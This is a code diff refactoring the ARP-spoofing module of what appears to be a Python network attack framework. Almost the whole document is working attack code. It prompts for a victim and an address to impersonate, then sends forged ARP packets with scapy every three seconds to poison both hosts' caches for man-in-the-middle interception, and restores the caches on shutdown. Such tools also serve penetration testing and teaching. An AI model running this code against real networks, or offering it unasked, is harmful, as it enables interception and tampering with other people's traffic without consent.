@@ -15,13 +15,10 @@ class arp(Poison):
 	def __init__(self):
 		# keep scapy quiet
 		conf.verb = 0
-		# addresses
-		self.local_mac = get_if_hwaddr(config.get('iface'))
-		self.local_ip = ''
-		self.to_ip = ''
-		self.from_ip = ''
-		self.from_mac = None
-		self.to_mac = None
+		# tuples (ip,mac)
+		self.local  = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
+		self.victim = ()
+		self.target = ()
 		# flag for spoofing 
 		self.spoofing = False
 		super(arp,self).__init__('ARP Spoof')
@@ -30,11 +27,14 @@ class arp(Poison):
 		"""Initialize the ARP spoofer
 		"""
 		try:
-			Msg('[!] Using interface [%s:%s]'%(config.get('iface'), self.local_mac))
+			Msg('[!] Using interface [%s:%s]'%(config.get('iface'), self.local[1]))
 			# get ip addresses from user
-			self.to_ip = raw_input("[!] Enter host to poison:\t")
-			self.from_ip = raw_input("[!] Enter address to spoof:\t")
-			tmp = raw_input("[!] Spoof IP {0} from victim {1}.  Is this correct? ".format(self.to_ip, self.from_ip))
+			to_ip = raw_input("[!] Enter host to poison:\t")
+			from_ip = raw_input("[!] Enter address to spoof:\t")
+			tmp = raw_input("[!] Spoof IP {0} from victim {1}.  Is this correct? ".format(to_ip, from_ip))
+
+			self.victim = (to_ip, getmacbyip(to_ip))
+			self.target = (from_ip, getmacbyip(from_ip))
 		except KeyboardInterrupt:
 			return None
 		except Exception, j:
@@ -51,15 +51,12 @@ class arp(Poison):
 			variables first!
 		"""
 		try:
-			# get mac addresses for both victims
-			self.to_mac = getmacbyip(self.to_ip)
-			self.from_mac = getmacbyip(self.from_ip)
 			# send ARP replies to victim
 			debug('Beginning ARP spoof to victim...')
-			victim_thread = Thread(target=self.respoofer, args=(self.from_ip, self.to_ip))
+			victim_thread = Thread(target=self.respoofer, args=(self.target, self.victim))
 			victim_thread.start()
 			# send ARP replies to spoofed address
-			target_thread = Thread(target=self.respoofer, args=(self.to_ip, self.from_ip))
+			target_thread = Thread(target=self.respoofer, args=(self.victim, self.target))
 			target_thread.start()
 			self.spoofing = True
 		except KeyboardInterrupt:
@@ -74,16 +71,15 @@ class arp(Poison):
 			Error('Error with ARP poisoner: %s'%j)
 			self.spoofing = False
 			return None
-		return self.to_ip
+		return self.victim[0]
 			
 	def respoofer(self, target, victim):
 		""" Respoof the target every three seconds.
 		"""
 		try:
-			target_mac = getmacbyip(target)
-			pkt = Ether(dst=target_mac,src=self.local_mac)/ARP(op="who-has",psrc=victim, pdst=target)
+			pkt = Ether(dst=target[1],src=self.local[1])/ARP(op="who-has",psrc=victim[0], pdst=target[0])
 			while self.spoofing:
-				sendp(pkt, iface_hint=target)
+				sendp(pkt, iface_hint=target[0])
 				time.sleep(3)
 		except Exception, j:
 			Error('Spoofer error: %s'%j)
@@ -105,20 +101,21 @@ class arp(Poison):
 		Msg("Initiating ARP shutdown...")
 		debug('initiating ARP shutdown')
 		self.spoofing = False
+		time.sleep(2) # give it a sec for the respoofer
 		# rectify the ARP caches
-		sendp(Ether(dst=self.to_mac,src=self.from_mac)/ARP(op='who-has', 
-								psrc=self.from_ip, pdst=self.to_ip),
-						inter=1, count=3)
-		sendp(Ether(dst=self.from_mac,src=self.to_mac)/ARP(op='who-has', 
-								psrc=self.to_ip,pdst=self.from_ip),
-						inter=1, count=3)
+		sendp(Ether(dst=self.victim[1],src=self.target[1])/ARP(op='who-has', 
+								psrc=self.target[0], pdst=self.victim[0]),
+						     count=1)
+		sendp(Ether(dst=self.target[1],src=self.victim[1])/ARP(op='who-has', 
+								psrc=self.victim[0],pdst=self.target[0]),
+						     count=1)
 		debug('ARP shutdown complete.')
 		return True
 	
 	def session_view(self):
 		""" Return the IP we're poisoning
 		"""
-		return self.to_ip
+		return self.victim[0]
 
 	def view(self):
 		""" ARP poisoner doesnt have a view, yet.
